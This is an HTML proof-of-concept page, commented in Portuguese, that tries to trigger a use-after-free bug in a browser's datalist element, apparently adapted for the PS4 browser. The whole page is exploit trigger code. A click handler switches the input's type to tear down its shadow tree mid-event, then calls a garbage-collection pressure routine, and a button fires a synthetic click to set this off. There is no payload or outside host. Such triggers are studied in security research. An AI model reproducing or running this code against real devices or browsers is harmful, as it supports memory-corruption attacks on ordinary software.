<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
<style>
input {
    width: 300px;
    height: 50px;
    font-size: 20px;
}
</style>
</head>
<body>

<p>Teste de UAF do DataList (PS4 Adaptado)</p>
<input id="input" type="text" list="list">
<datalist id="list">
    <option value="a">
    <option value="b">
</datalist>

<button id="trigger">Disparar Teste</button>

<script>
function gc() {
    function gcRec(n) {
          if (n < 1)
              return {};
          var temp = {i: "ab" + i + (i / 100000)};
          temp += "foo";
          gcRec(n-1);
    }
    for (var i = 0; i < 10000; i++)
    gcRec(10);
}

const inputElement = document.getElementById('input');
const triggerButton = document.getElementById('trigger');

// O listener que altera o tipo do input durante o evento de clique
inputElement.addEventListener('click', (e) => {
    // Altera o tipo para forçar a remoção da árvore de sombra antiga (TextFieldInputType)
    inputElement.type = 'button';
    
    // Tenta forçar a coleta de lixo se exposta pelo motor, senão ignora
    
        gc();
    
}, { once: true });

triggerButton.addEventListener('click', () => {
    // No navegador do PS4, podemos focar e simular o clique ou disparar o evento programaticamente
    inputElement.focus();
    
    // Dispara um evento de clique simulado direto no input para acionar o botão de datalist interno
    const clickEvent = new MouseEvent('click', {
        view: window,
        bubbles: true,
        cancelable: true
    });
    inputElement.dispatchEvent(clickEvent);
});
</script>
</body>
</html>
